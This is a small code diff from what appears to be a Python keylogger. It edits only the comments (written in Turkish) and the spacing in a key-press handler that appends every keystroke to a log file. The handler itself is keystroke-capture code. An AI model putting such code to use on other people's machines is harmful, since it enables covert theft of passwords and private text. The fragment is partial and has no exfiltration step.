@@ -14,9 +14,9 @@ def on_press(key):
 
         with open(log_file, "a") as f:
             if key == Key.enter:
-                f.write("\n") # entera basıldıgında yeni satıra geç
-            elif key == Key.space: #Boşluk tuşuna basıldığında boşluk koy
-                f.write(" ")
+                f.write("\n")  # enter'a basıldıgında yeni satıra geç
+            elif key == Key.space: 
+                f.write(" ")  #Boşluk tuşuna basıldığında boşluk koy    
             elif key != Key.enter and key != Key.space:
                 f.write(f"[{key}]")
             f.write("")
